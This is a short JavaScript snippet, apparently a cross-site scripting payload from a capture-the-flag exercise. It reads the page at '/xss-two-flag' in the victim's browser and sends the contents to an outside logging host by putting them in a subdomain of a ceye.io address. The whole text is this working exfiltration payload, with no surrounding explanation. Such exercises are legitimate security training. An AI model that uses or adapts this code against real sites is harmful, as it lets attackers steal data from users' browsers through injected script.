var xhr = new XMLHttpRequest();
xhr.open("GET", "/xss-two-flag", false);
xhr.send(null);
var xhr1 = new XMLHttpRequest();
xhr1.open("GET","https://"+xhr.response+".my58ld.ceye.io/",false);
xhr1.send(null);
